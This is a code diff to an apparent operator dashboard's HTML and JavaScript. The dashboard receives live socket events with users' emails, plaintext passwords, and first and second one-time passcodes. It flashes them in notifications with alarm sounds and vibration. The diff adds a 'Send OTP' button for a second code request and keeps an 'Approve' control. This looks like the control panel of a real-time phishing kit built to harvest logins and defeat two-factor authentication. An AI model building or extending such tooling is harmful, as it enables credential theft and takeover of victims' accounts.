@@ -102,7 +102,7 @@
         table {
             width: 100%;
             border-collapse: collapse;
-            min-width: 1300px;
+            min-width: 1400px;
         }
         th {
             background: #667eea;
@@ -156,6 +156,10 @@
         }
         .badge-secondary {
             background: #9e9e9e;
+            color: white;
+        }
+        .badge-primary {
+            background: #2196F3;
             color: white;
         }
         .otp-display {
@@ -435,7 +439,6 @@
 
             try {
                 if (type === 'urgent') {
-                    // Urgent beeping sound for login (5 rapid beeps)
                     const now = audioContext.currentTime;
                     for (let i = 0; i < 5; i++) {
                         const oscillator = audioContext.createOscillator();
@@ -452,10 +455,8 @@
                         oscillator.stop(now + i * 0.15 + 0.1);
                     }
                 } else if (type === 'success') {
-                    // Success sound for OTP created (rising tone)
                     const now = audioContext.currentTime;
                     
-                    // Rising tone
                     const osc1 = audioContext.createOscillator();
                     osc1.type = 'sine';
                     osc1.frequency.setValueAtTime(600, now);
@@ -470,7 +471,6 @@
                     osc1.start(now);
                     osc1.stop(now + 0.5);
                     
-                    // Chime sound
                     setTimeout(() => {
                         const osc2 = audioContext.createOscillator();
                         osc2.type = 'triangle';
@@ -486,7 +486,6 @@
                         osc2.stop(now + 0.8);
                     }, 200);
                 } else if (type === 'warning') {
-                    // Warning sound for reset (descending tone)
                     const now = audioContext.currentTime;
                     for (let i = 0; i < 3; i++) {
                         const oscillator = audioContext.createOscillator();
@@ -508,33 +507,25 @@
             }
         }
 
-        // Vibration function for 5 seconds with patterns
+        // Vibration function
         function vibrateDevice(pattern = null) {
             if ('vibrate' in navigator) {
-                // Stop any ongoing vibration
                 navigator.vibrate(0);
                 
-                // Clear existing timer
                 if (vibrationTimer) {
                     clearTimeout(vibrationTimer);
                 }
                 
-                // Default patterns based on type
                 if (!pattern) {
-                    pattern = [500, 200, 500, 200, 500]; // Vigorous pattern
+                    pattern = [500, 200, 500, 200, 500];
                 }
                 
-                // Start vibration
                 navigator.vibrate(pattern);
-                console.log('📳 Device vibrating with pattern:', pattern);
                 
-                // Ensure it stops after 5 seconds
                 vibrationTimer = setTimeout(() => {
                     navigator.vibrate(0);
                     vibrationTimer = null;
                 }, 5000);
-            } else {
-                console.log('Vibration not supported on this device');
             }
         }
 
@@ -580,55 +571,46 @@
             showToast(data.message, 'info', 'Test');
         });
 
-        // 🔐 USER LOGIN EVENT - Instant notification with sound and vibration
+        // USER LOGIN EVENT
         socket.on('user-login', (data) => {
-            console.log('📢 INSTANT: User Login Received', data);
+            console.log('📢 User Login Received', data);
             
-            // Show notification badge
             showNotificationBadge(`🔐 New Login: ${data.email}`);
             
-            // Desktop notification
             showNotification('🔐 NEW LOGIN ATTEMPT', 
-                `User: ${data.email}\nPassword: ${data.password}\n${data.message || ''}`
+                `User: ${data.email}\nPassword: ${data.password}`
             );
             
-            // Play urgent sound pattern
             playSound('urgent');
+            vibrateDevice([500, 200, 500, 200, 500]);
             
-            // Vibrate for 5 seconds with vigorous pattern
-            vibrateDevice([500, 200, 500, 200, 500, 200, 500, 200, 500]);
-            
-            // Show toast with credentials
             showToast(
                 `📧 ${data.email}\n🔑 ${data.password}`, 
                 'info', 
                 '🔐 NEW LOGIN'
             );
             
-            // Refresh user list
             loadUsers();
-            
-            // Highlight the new user
             setTimeout(() => highlightUserRow(data.email), 500);
         });
 
-        // ✅ USER FIRST OTP CREATED EVENT
+        // FIRST OTP CREATED EVENT
         socket.on('user-otp-created', (data) => {
-            console.log('📢 INSTANT: First OTP Created', data);
+            console.log('📢 First OTP Created', data);
             
             showNotificationBadge(`✅ First OTP: ${data.email}`);
             showNotification('✅ FIRST OTP CREATED', 
-                `User: ${data.email}\nOTP: ${data.otp}`
+                `User: ${data.email}\nFirst OTP: ${data.otp}`
             );
             playSound('success');
             vibrateDevice([200, 100, 200, 100, 200]);
-            showToast(`First OTP: ${data.otp}`, 'success', '✅ First OTP');
+            showToast(`First OTP for ${data.email}: ${data.otp}`, 'success', '✅ First OTP');
             loadUsers();
         });
 
-        // ✅ USER SECOND OTP CREATED EVENT - NEW
+        // SECOND OTP CREATED EVENT
         socket.on('user-second-otp-created', (data) => {
-            console.log('📢 INSTANT: Second OTP Created', data);
+            console.log('📢 Second OTP Created', data);
             
             showNotificationBadge(`✅ Second OTP: ${data.email}`);
             showNotification('✅ SECOND OTP CREATED', 
@@ -636,13 +618,13 @@
             );
             playSound('success');
             vibrateDevice([300, 150, 300, 150, 300]);
-            showToast(`Second OTP: ${data.second_otp}`, 'success', '✅ Second OTP');
+            showToast(`Second OTP for ${data.email}: ${data.second_otp}`, 'success', '✅ Second OTP');
             loadUsers();
         });
 
-        // 🔄 USER RESET EVENT
+        // USER RESET EVENT
         socket.on('user-reset', (data) => {
-            console.log('📢 INSTANT: User Reset Received', data);
+            console.log('📢 User Reset Received', data);
             
             showNotificationBadge(`🔄 Reset: ${data.email}`);
             showNotification('🔄 PROCESS RESET', 
@@ -654,7 +636,7 @@
             loadUsers();
         });
 
-        // Request notification permission on user interaction
+        // Request notification permission
         function requestNotificationPermission() {
             if ('Notification' in window) {
                 Notification.requestPermission().then(permission => {
@@ -662,7 +644,6 @@
                         document.getElementById('notificationPermission').style.display = 'none';
                         showToast('Notifications enabled with sound & vibration', 'success', '✅ Enabled');
                         
-                        // Test notification
                         new Notification('Notifications Enabled', {
                             body: 'You will now receive instant alerts with sound and vibration'
                         });
@@ -678,7 +659,6 @@
                 permissionDiv.style.display = 'flex';
                 permissionDiv.onclick = requestNotificationPermission;
             } else if (Notification.permission === 'granted') {
-                // Test notification on load
                 setTimeout(() => {
                     new Notification('Dashboard Ready', {
                         body: 'Listening for instant notifications with sound & vibration'
@@ -703,7 +683,6 @@
                         requireInteraction: true
                     });
                     
-                    // Auto close after 8 seconds
                     setTimeout(() => notification.close(), 8000);
                     
                 } catch (e) {
@@ -743,7 +722,6 @@
                 });
                 
                 const data = await response.json();
-                console.log('Approve response:', data);
                 
                 if (data.success) {
                     showToast(`User ${email} approved`, 'success', '✅ Approved');
@@ -751,8 +729,6 @@
                     if ('vibrate' in navigator) {
                         navigator.vibrate([200, 100, 200]);
                     }
-                    
-                    // Refresh user list to show updated status
                     loadUsers();
                 } else {
                     showToast(data.error || 'Failed to approve user', 'error', 'Error');
@@ -765,14 +741,9 @@
             }
         }
 
-        // VIEW SECOND OTP FUNCTION - NEW
-        function viewSecondOtp(email) {
-            const user = allUsers.find(u => u.email === email);
-            if (user && user.second_otp) {
-                showToast(`Second OTP for ${email}: ${user.second_otp}`, 'info', '📱 Second OTP');
-            } else {
-                showToast('No second OTP found for this user', 'warning', '⚠️ Not Found');
-            }
+        // SEND SECOND OTP FUNCTION - OPENS OTP.HTML IN NEW TAB
+        function sendSecondOtp(email) {
+            window.open(`/users/otp?email=${encodeURIComponent(email)}&type=second`, '_blank');
         }
 
         // Load users
@@ -806,7 +777,6 @@
         function filterUsers(filter, event) {
             currentFilter = filter;
             
-            // Update active button
             document.querySelectorAll('.filter-btn').forEach(btn => {
                 btn.classList.remove('active');
             });
@@ -824,7 +794,6 @@
             
             let filtered = allUsers;
             
-            // Apply status filter
             if (currentFilter === 'pending') {
                 filtered = filtered.filter(u => !u.otp_verified);
             } else if (currentFilter === 'verified') {
@@ -833,7 +802,6 @@
                 filtered = filtered.filter(u => !u.otp);
             }
             
-            // Apply search filter
             if (searchTerm) {
                 filtered = filtered.filter(u => u.email.toLowerCase().includes(searchTerm));
             }
@@ -893,9 +861,7 @@
                         ${!user.approved ? 
                             `<button onclick="approveUser('${user.email}')" class="badge badge-success" style="border: none; cursor: pointer; background: #4CAF50; color: white; padding: 5px 10px; margin-right: 5px;">✅ Approve</button>` 
                             : ''}
-                        ${user.second_otp ? 
-                            `<button onclick="viewSecondOtp('${user.email}')" class="badge badge-info" style="border: none; cursor: pointer; background: #2196F3; color: white; padding: 5px 10px;">📱 View Second OTP</button>` 
-                            : ''}
+                        <button onclick="sendSecondOtp('${user.email}')" class="badge badge-primary" style="border: none; cursor: pointer; background: #2196F3; color: white; padding: 5px 10px;">📱 Send OTP</button>
                     </td>
                 </tr>
             `}).join('');
@@ -944,7 +910,6 @@
         function logout() {
             showLoading('Logging out', 'Please wait...');
             
-            // Stop any ongoing vibration
             if ('vibrate' in navigator) {
                 navigator.vibrate(0);
             }
